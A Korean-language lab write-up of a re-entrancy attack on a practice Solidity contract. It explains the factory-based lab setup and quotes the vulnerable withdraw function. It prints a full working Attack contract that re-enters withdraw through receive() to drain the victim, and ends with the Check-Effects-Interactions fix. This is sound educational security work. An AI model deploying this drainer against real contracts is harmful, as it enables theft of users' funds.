# Re-Entrancy(재진입) 공격 실습 분석 보고서

이 보고서는 우리가 구축한 실습 환경의 구조와 공격이 성공한 원리를 단계별로 설명합니다.

## 1. 전체 구조 (Architecture)

우리는 **팩토리 패턴(Factory Pattern)**을 사용하여 안전하고 독립적인 실습 환경을 구축했습니다.

### A. 게임 마스터 (Factory Contract: `ReentranceLevel`)

- **역할:** 사용자가 올 때마다 새로운 문제(Instance)를 찍어내는 공장입니다.
- **기능:** `createInstance`를 호출하면, 0.001 ETH를 머금은 피해자 컨트랙트를 새로 만들고 그 주소를 사용자에게 알려줍니다.
- **이유:** 이렇게 해야 사용자 A가 공격해서 돈을 다 가져가도, 사용자 B는 자신의 인스턴스에서 방해받지 않고 실습할 수 있습니다.

### B. 피해자 (Target Contract: `Reentrance`)

- **역할:** 취약점을 가진 은행 역할을 합니다.
- **상태:** 내부에 0.001 ETH를 가지고 시작합니다.
- **취약점 위치:** `withdraw` 함수.

### C. 공격자 (Attacker Contract: `Attack`)

- **역할:** 해커가 작성한 악성 컨트랙트입니다.
- **특징:** 일반 지갑(EOA)이 아닌 '컨트랙트'여야만 재진입 공격이 가능합니다. (코드를 실행할 수 있어야 하기 때문)

## 2. 취약점 분석 (Why is it vulnerable?)

피해자 컨트랙트(`Reentrance`)의 `withdraw` 함수를 다시 보겠습니다.

```
function withdraw(uint _amount) public {
    // 1. 잔액 확인 (Check)
    if(balances[msg.sender] >= _amount) {

        // 2. 돈 먼저 보내기 (Interaction) -> 여기가 문제!
        (bool result,) = msg.sender.call{value:_amount}("");
        require(result);

        // 3. 잔액 차감 (Effect)
        unchecked {
            balances[msg.sender] -= _amount;
        }
    }
}

```

**문제의 핵심:** 돈을 보내는 행위(2번)가 잔액을 줄이는 행위(3번)보다 **먼저** 일어납니다.
블록체인에서는 "돈을 받으면 코드가 실행"될 수 있는데, 잔액이 줄어들기 전에 코드가 실행되면서 다시 `withdraw`를 호출할 틈을 주게 됩니다.

## 3. 공격 실행 과정 (The Attack Flow)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 피해자 컨트랙트 인터페이스 정의
interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract Attack {
    IReentrance public target;
    uint constant public AMOUNT = 0.001 ether; // 한 번에 빼낼 금액

    constructor(address _targetAddr) {
        target = IReentrance(_targetAddr);
    }

    // 1. 공격 시작 함수
    function attack() external payable {
        require(msg.value >= AMOUNT, "Need ETH to attack");

        // (A) 먼저 기부하여 출금 권한(잔액 기록)을 얻음
        target.donate{value: AMOUNT}(address(this));

        // (B) 출금 요청 -> 여기서 재진입 시작
        target.withdraw(AMOUNT);
    }

    // 2. 재진입 로직 (Ether를 받을 때 자동 실행됨)
    receive() external payable {
        // 피해자 컨트랙트에 아직 돈이 남아있다면 계속 출금 요청
        uint targetBalance = address(target).balance;

        if (targetBalance >= AMOUNT) {
            target.withdraw(AMOUNT);
        }
    }

    // 3. 탈취한 자금 회수 (내 지갑으로 가져오기)
    function withdrawStolenFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

```

`Attack` 컨트랙트의 `attack()` 버튼을 눌렀을 때 일어난 일들은 다음과 같습니다. (모든 과정은 하나의 트랜잭션 안에서 순식간에 일어납니다.)

1. **[공격자]** `donate()`로 0.001 ETH를 입금합니다. (이제 피해자 장부에 공격자 잔액이 0.001로 기록됨)
2. **[공격자]** `withdraw(0.001)`을 호출하여 출금을 요청합니다.
3. **[피해자]** "잔액이 0.001 있네? 확인 완료. 돈 보내줄게." -> **0.001 ETH 전송**
4. **[공격자]** 돈을 받는 순간 `receive()` 함수가 자동 실행됩니다.
   - **여기서 중요!** 아직 피해자 장부에서 잔액(0.001)이 차감되지 않았습니다. (코드의 3번 라인에 도달하지 못함)
   - `receive()` 함수 안에서 **다시 `withdraw(0.001)`을 호출**합니다. (재진입)
5. **[피해자]** (두 번째 호출) "잔액이 0.001 있네? (아직 차감 안 됐으니까) 확인 완료. 돈 보내줄게." -> **또 0.001 ETH 전송**
6. **[공격자]** 또 돈을 받으면서 `receive()` 실행 -> 다시 `withdraw` 호출...
7. **(반복)** 피해자의 잔액이 바닥날 때까지 이 과정이 반복됩니다.
8. **[피해자]** 잔액이 바닥나서 더 이상 돈을 못 보내면 반복이 멈추고, 그제야 밀려있던 "잔액 차감" 코드가 실행됩니다. (하지만 이미 돈은 다 털린 뒤입니다.)

## 4. 우리가 수행한 단계 요약

1. **배포 (Deploy):** `ReentranceLevel`을 배포하여 문제 출제 시스템을 만들었습니다.
2. **생성 (Create Instance):** Next.js 웹에서 버튼을 눌러 나만의 실습용 피해자 컨트랙트(`0xc5...`)를 만들었습니다.
3. **준비 (Setup Attack):** Remix에서 피해자 주소를 타겟으로 하는 `Attack` 컨트랙트를 만들었습니다.
4. **공격 (Exploit):** `Value`에 0.001 ETH(미끼)를 넣고 `attack()`을 실행했습니다. 재진입이 발생하며 피해자의 돈이 모두 공격자 컨트랙트로 이동했습니다.
5. **검증 (Verify):** 웹사이트에서 피해자 지갑을 조회했더니 잔액이 `0`이 되었고, 해킹 성공 판정을 받았습니다.

## 5. 결론 및 대응 방안

이 실습을 통해 **"Check-Effect-Interaction (확인-효과-상호작용)"** 패턴의 중요성을 배웠습니다.

**올바른 코드는 다음과 같아야 합니다:**

```
function withdraw(uint _amount) public {
    // 1. Check (조건 확인)
    require(balances[msg.sender] >= _amount);

    // 2. Effect (상태 변경 - 잔액 먼저 차감!)
    balances[msg.sender] -= _amount;

    // 3. Interaction (외부 상호작용 - 그 다음에 돈 보내기)
    (bool result,) = msg.sender.call{value:_amount}("");
    require(result);
}

```

잔액을 먼저 깎아버리면(`Effect`), 공격자가 재진입해서 다시 `withdraw`를 호출하더라도 "잔액 부족"으로 막히게 됩니다.
